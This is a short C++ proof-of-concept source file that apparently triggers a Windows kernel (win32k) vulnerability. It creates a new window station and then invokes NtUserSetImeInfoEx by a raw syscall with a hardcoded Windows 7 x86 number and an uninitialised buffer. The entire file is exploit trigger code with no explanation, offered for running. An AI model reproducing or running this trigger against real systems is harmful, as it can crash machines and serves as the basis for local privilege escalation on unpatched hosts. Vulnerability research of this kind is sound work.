// poc.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

#ifndef _WIN64
DWORD gSyscall = 0x1226; //win7 x32
__declspec(naked) void NtUserSetImeInfoEx(PVOID arg1)
{
	_asm {
		mov esi, arg1;
		mov eax, gSyscall;
		mov edx, 0x7FFE0300;
		call dword ptr[edx];
		ret 4;
	}
}
#else
extern "C" void NtUserSetImeInfoEx(PVOID); 
#endif
int _tmain(int argc, _TCHAR* argv[])
{
	HWINSTA hsta = CreateWindowStationW(0,0,READ_CONTROL,0); 

	SetProcessWindowStation(hsta); 

	CHAR arg[0x800];

	NtUserSetImeInfoEx(&arg);

	return 0;
}

